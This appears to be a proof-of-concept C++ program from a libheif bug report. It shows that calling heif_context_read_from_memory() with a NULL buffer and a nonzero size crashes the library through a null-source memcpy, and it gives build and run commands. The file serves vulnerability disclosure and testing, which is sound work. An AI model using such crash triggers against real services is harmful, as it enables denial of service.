/*
 * Bug 09 POC 1: NULL data pointer passed to heif_context_read_from_memory()
 *
 * Vulnerable code: libheif/bitstream.cc:83
 *   StreamReader_memory::StreamReader_memory(const uint8_t* data, size_t size, bool copy)
 *   {
 *     if (copy) {
 *       m_owned_data = new uint8_t[m_length];
 *       memcpy(m_owned_data, data, size);  // <-- data is NULL, size > 0 -> SIGSEGV
 *     }
 *   }
 *
 * Trigger: heif_context_read_from_memory(ctx, NULL, 64, NULL)
 * Result:  SIGSEGV / AddressSanitizer: SEGV on address 0x0 (memcpy with null src)
 *
 * Build:
 *   clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
 *     -I<libheif_api> -I<cmake_build_dir> \
 *     poc_read_from_memory.cc libheif.a \
 *     /usr/lib/x86_64-linux-gnu/libz.so.1 -lm -lpthread -ldl \
 *     -o poc_read_from_memory
 *
 * Run:
 *   ./poc_read_from_memory
 */

#include <cstdlib>
#include <cstdio>
#include <libheif/heif.h>
#include <libheif/heif_context.h>

int main() {
    fprintf(stderr, "[+] Bug 09 POC 1: NULL data to heif_context_read_from_memory()\n");
    fprintf(stderr, "[+] Vulnerable location: libheif/bitstream.cc:83\n");

    heif_context* ctx = heif_context_alloc();
    if (!ctx) {
        fprintf(stderr, "[-] heif_context_alloc() failed\n");
        return 1;
    }

    fprintf(stderr, "[+] Calling heif_context_read_from_memory(ctx, NULL, 64, NULL)\n");
    /*
     * data=NULL, size=64:
     *   heif_context_read_from_memory()
     *   -> HeifContext::read_from_memory(NULL, 64, copy=true)
     *   -> HeifFile::read_from_memory(NULL, 64, true)
     *   -> make_shared<StreamReader_memory>((const uint8_t*)NULL, 64, true)
     *   -> StreamReader_memory ctor: memcpy(m_owned_data, NULL, 64) -> SIGSEGV
     */
    heif_error err = heif_context_read_from_memory(ctx, NULL, 64, NULL);

    /* Should not reach here */
    fprintf(stderr, "[-] UNEXPECTED: returned without crash, code=%d message=%s\n",
            err.code, err.message ? err.message : "(null)");
    heif_context_free(ctx);
    return 0;
}
